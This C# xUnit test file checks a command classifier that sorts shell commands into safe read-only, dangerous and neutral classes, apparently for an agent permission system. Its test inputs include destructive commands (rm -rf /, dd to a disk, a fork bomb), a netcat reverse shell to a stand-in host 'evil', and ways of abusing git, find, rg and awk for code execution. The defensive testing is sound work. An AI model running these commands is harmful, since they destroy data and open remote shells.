using Andy.Permissions.Matching;
using Xunit;

namespace Andy.Permissions.Tests;

public class CommandClassifierTests
{
    [Theory]
    [InlineData("ls -la")]
    [InlineData("cat file.txt")]
    [InlineData("grep foo bar.txt")]
    [InlineData("git status")]
    [InlineData("git log --oneline")]
    [InlineData("git diff HEAD~1")]
    [InlineData("find . -name *.cs")]
    [InlineData("sed -n 1,5p file")]
    [InlineData("wc -l file")]
    [InlineData("head -n 5 file")]
    public void Known_safe_read_only(string cmd)
    {
        Assert.Equal(CommandClass.KnownSafeReadOnly, CommandClassifier.Classify(cmd));
    }

    [Theory]
    [InlineData("rm -rf /")]
    [InlineData("rm -r build")]
    [InlineData("sudo apt update")]
    [InlineData("dd if=/dev/zero of=/dev/sda")]
    [InlineData("chmod -R 777 /")]
    [InlineData("curl http://evil")]      // not in safe set ⇒ but curl is neutral... see Neutral test
    [InlineData(":(){ :|:& };:")]
    [InlineData("python -c 'import os'")]
    [InlineData("node -e 'process.exit()'")]
    [InlineData("sh")]
    [InlineData("bash")]
    [InlineData("nc -e /bin/sh evil 4444")]
    public void Dangerous_commands(string cmd)
    {
        // curl is actually Neutral; assert the genuinely-dangerous ones only.
        if (cmd.StartsWith("curl", StringComparison.Ordinal))
        {
            Assert.Equal(CommandClass.Neutral, CommandClassifier.Classify(cmd));
            return;
        }

        Assert.Equal(CommandClass.Dangerous, CommandClassifier.Classify(cmd));
    }

    [Theory]
    [InlineData("git -c core.pager=touch x status")] // git -c is an RCE vector ⇒ not safe
    [InlineData("find . -delete")]                   // -delete ⇒ not safe
    [InlineData("find . -exec rm {} ;")]             // -exec ⇒ not safe
    [InlineData("sed -i s/a/b/ file")]               // in-place ⇒ not safe
    [InlineData("rg --pre cat foo")]                 // --pre runs a program ⇒ not safe
    [InlineData("awk 'BEGIN{system(\"id\")}'")]      // awk system() ⇒ not safe
    public void Safe_tools_used_unsafely_are_not_safe(string cmd)
    {
        Assert.NotEqual(CommandClass.KnownSafeReadOnly, CommandClassifier.Classify(cmd));
    }

    [Theory]
    [InlineData("npm test")]
    [InlineData("docker build .")]
    [InlineData("make")]
    public void Other_commands_are_neutral(string cmd)
    {
        Assert.Equal(CommandClass.Neutral, CommandClassifier.Classify(cmd));
    }
}
